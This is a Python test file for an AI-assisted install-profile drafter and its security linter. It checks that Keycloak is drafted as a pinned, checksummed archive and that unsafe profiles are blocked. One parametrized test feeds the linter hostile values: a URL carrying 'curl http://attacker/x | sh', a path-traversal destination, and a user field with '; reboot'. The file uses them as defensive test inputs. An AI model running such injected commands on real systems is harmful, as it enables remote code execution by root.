"""Software that ships as an archive, drafted from measured facts (C6b).

REQ-2026-0177 proved on a real machine that `dnf install keycloak` installs
nothing — the machine said "package keycloak is not installed" and the proof
failed on that evidence, exactly as designed. A package-name guess cannot
install a tarball. What such software needs the drafter to KNOW is a pinned
release URL, its checksum, and the unit that runs it.

The facts in ARCHIVE_KNOWLEDGE are measured, not recalled: the version was read
from the project's own releases API and the sha256 computed from the downloaded
artifact (265 MB, hashed 2026-08-22). A plausible URL from memory is exactly
the class of guess the proof exists to refute.

The linter rules here are the security half. An archive profile is a root code
execution instruction — the machine fetches the URL and executes what is
inside — so https is non-negotiable, the destination is confined to /opt, and
a missing checksum is at least named.
"""

from __future__ import annotations

import json

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from api import ai_blueprint as ab
from db.seed import seed
from db.session import Base


@pytest.fixture(autouse=True)
def _mock(monkeypatch):
    monkeypatch.setenv("AI_MODE", "mock")


@pytest.fixture()
def db():
    engine = create_engine("sqlite+pysqlite:///:memory:",
                           connect_args={"check_same_thread": False},
                           poolclass=StaticPool, future=True)
    Base.metadata.create_all(engine)
    s = sessionmaker(bind=engine, expire_on_commit=False)()
    seed(s)
    s.commit()
    yield s
    s.close()


def keycloak_profile(db):
    d = ab.draft("keycloak", db)
    return d, json.loads(next(iter(d.files.values())))


# --- the keycloak draft comes from knowledge, not a guess ---------------------

def test_keycloak_is_drafted_as_an_archive_not_a_package_guess(db):
    """The guess was refuted by a machine on REQ-2026-0177. Guessing the same
    thing again would spend another machine to learn the same fact."""
    d, profile = keycloak_profile(db)

    assert not d.blocked, [f.detail for f in d.findings]
    assert "archive" in profile, "keycloak went back to the refuted package guess"
    assert "keycloak" not in profile["rhel"]["packages"], (
        "the archive software is also listed as a package — rpm -q would report "
        "it NOT INSTALLED on every healthy machine")


def test_the_archive_facts_are_pinned_and_verifiable(db):
    _, profile = keycloak_profile(db)
    archive = profile["archive"]

    assert archive["url"].startswith("https://")
    assert "26.7.2" in archive["url"], "the release is not pinned"
    assert len(archive["sha256"]) == 64, "no computed checksum travels with the URL"
    assert archive["dest"].startswith("/opt/")
    assert archive["unit"]["exec_start"], "nothing would start it"


def test_the_dependency_is_a_machine_proven_package(db):
    """java-21-openjdk-headless was installed and version-reported by a real
    machine (REQ-2026-0139). The dependency list must stay in proven territory —
    it is the one part of an archive install the package manager still owns."""
    _, profile = keycloak_profile(db)
    assert profile["rhel"]["packages"] == ["java-21-openjdk-headless"]


def test_the_machine_can_still_be_asked_what_it_got(db):
    _, profile = keycloak_profile(db)
    assert profile["expects"] == "26"
    assert "kc.sh" in profile["version_command"]


def test_an_unknown_technology_still_gets_the_cheap_guess(db):
    """The knowledge base must not become a gate: software outside it keeps the
    package guess, which costs one sandbox machine to confirm or refute."""
    d = ab.draft("haproxy", db)
    profile = json.loads(next(iter(d.files.values())))
    assert "archive" not in profile
    assert profile["rhel"]["packages"] == ["haproxy"]


# --- the linter: root is about to execute what the profile points at ----------
#
# The RULES now live in common/profile_rules and are exercised exhaustively in
# common/tests/test_profile_rules.py — including every escape the adversarial
# review demonstrated. What is asserted here is that api.review_profile actually
# ENFORCES them, because for one afternoon it had its own prefix-based copy and
# a fully weaponised profile passed it with zero findings.

def base_archive():
    return {
        "code": "thing", "builds_on": "oci/service-vm", "ports": [1234],
        "expects": "3",
        "version_command": "/opt/thing/bin/thing --version",
        "archive": {"url": "https://example.com/thing.tar.gz",
                    "sha256": "a" * 64, "dest": "/opt/thing", "user": "thing",
                    "unit": {"exec_start": "/opt/thing/bin/thing run"}},
        "rhel": {"packages": [], "services": ["thing"]},
    }


def blockers(profile):
    return [f.rule for f in ab.review_profile(profile) if f.severity == "blocker"]


def test_a_clean_archive_profile_passes():
    assert blockers(base_archive()) == []


@pytest.mark.parametrize("path,value", [
    ("url", "http://example.com/thing.tar.gz"),
    ("url", "https://example.com/thing.tar.gz; curl http://attacker/x | sh"),
    ("dest", "/etc"),
    ("dest", "/opt/../.."),
    ("user", "thing; reboot"),
])
def test_the_shared_rules_are_actually_enforced_here(path, value):
    """Not a duplicate of the shared tests: this asserts the API's gate calls
    them at all. It once had its own prefix-checking copy that let all of these
    through."""
    profile = base_archive()
    profile["archive"][path] = value
    assert blockers(profile), f"archive.{path}={value!r} was published"


def test_a_missing_checksum_now_BLOCKS(db):
    """CHANGED after review. It was a warning for one afternoon, on the reasoning
    that TLS and the sandbox bounded it — but TLS only proves the host is the
    host the profile NAMED, and with a model choosing that host the checksum is
    the entire question. Nothing unverified is executed by root."""
    profile = base_archive()
    del profile["archive"]["sha256"]
    assert "profile-refused" in blockers(profile)


def test_an_archive_only_profile_is_not_blocked_for_installing_no_package():
    """The software IS the archive. The install-nothing rule exists for profiles
    that install nothing at all, and this one installs plenty."""
    assert blockers(base_archive()) == []


def test_a_profile_that_installs_nothing_at_all_is_blocked():
    profile = base_archive()
    del profile["archive"]
    profile["rhel"] = {"packages": [], "services": []}
    assert blockers(profile)


def test_the_linter_does_not_raise_on_malformed_model_output():
    """A model returning "unit": "thing.service" made it throw AttributeError,
    which 500s the drafting endpoint and takes the autonomous path down."""
    profile = base_archive()
    profile["archive"]["unit"] = "thing.service"
    assert blockers(profile), "malformed unit accepted"
